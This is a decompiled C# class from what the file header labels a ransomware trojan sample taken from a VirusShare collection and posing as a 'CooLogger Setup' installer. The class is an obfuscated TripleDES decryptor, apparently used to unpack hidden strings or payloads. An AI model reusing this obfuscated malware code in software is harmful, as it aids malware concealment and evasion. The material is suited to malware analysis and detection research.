// Decompiled with JetBrains decompiler
// Type: RuwdwDLzfopnsQX
// Assembly: CooLogger Setup v3.2, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: F3D1EA50-2213-48BF-B700-67DF9B6A4071
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00041-msil\Trojan-Ransom.Win32.Blocker.hfgu-0d0af29634578ca3e548a3e7d1d405c09242ee3825ddf8c1ef1e001713b226bf.exe

using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

internal class RuwdwDLzfopnsQX
{
  private TripleDESCryptoServiceProvider WRuwdwDLzfopnsQ;
  private UTF8Encoding XeIVUkoqiIXPzhj;
  private byte[] FhlzvesRSsCOqKo;
  private byte[] NfFfqkDlJsDJFRh;

  public RuwdwDLzfopnsQX(byte[] key, byte[] iv)
  {
    this.WRuwdwDLzfopnsQ = new TripleDESCryptoServiceProvider();
    this.XeIVUkoqiIXPzhj = new UTF8Encoding();
    this.FhlzvesRSsCOqKo = key;
    this.NfFfqkDlJsDJFRh = iv;
  }

  public byte[] hlzvesRSsCOqKoN(byte[] rqvgnuLlkBqtlKn) => this.wEGPmhLNtzTbRwr(rqvgnuLlkBqtlKn, this.WRuwdwDLzfopnsQ.CreateDecryptor(this.FhlzvesRSsCOqKo, this.NfFfqkDlJsDJFRh));

  public string hlzvesRSsCOqKoN(string text) => this.XeIVUkoqiIXPzhj.GetString(this.wEGPmhLNtzTbRwr(Convert.FromBase64String(text), this.WRuwdwDLzfopnsQ.CreateDecryptor(this.FhlzvesRSsCOqKo, this.NfFfqkDlJsDJFRh)));

  private byte[] wEGPmhLNtzTbRwr(byte[] rqvgnuLlkBqtlKn, ICryptoTransform CryptoTransform)
  {
    MemoryStream memoryStream = new MemoryStream();
    CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, CryptoTransform, CryptoStreamMode.Write);
    cryptoStream.Write(rqvgnuLlkBqtlKn, 0, rqvgnuLlkBqtlKn.Length);
    cryptoStream.FlushFinalBlock();
    memoryStream.Position = 0L;
    byte[] buffer = new byte[checked ((int) (memoryStream.Length - 1L) + 1)];
    memoryStream.Read(buffer, 0, buffer.Length);
    memoryStream.Close();
    cryptoStream.Close();
    return buffer;
  }
}
